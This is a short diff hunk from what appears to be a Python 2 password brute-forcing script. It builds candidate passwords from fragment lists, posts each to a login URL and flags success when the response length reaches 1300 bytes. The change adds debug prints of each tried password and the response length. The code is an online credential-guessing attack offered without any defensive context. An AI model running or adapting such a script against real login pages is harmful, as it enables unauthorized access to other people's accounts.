@@ -51,8 +51,8 @@ def verify(index, sem):
 
                 login_info['password'] = '27'+password_middle[password_divi[index]+j]+password_male[m]+password_index[n]
                 loginRequest = requests.post(request_url, data=login_info, headers=headers)
-
-                #print password_array[index]
+                print login_info['password']
+                print loginRequest.headers['content-length']
                 if loginRequest.headers['content-length'] >= '1300':
                     lock.acquire()
                     print "The password is " + login_info['password']
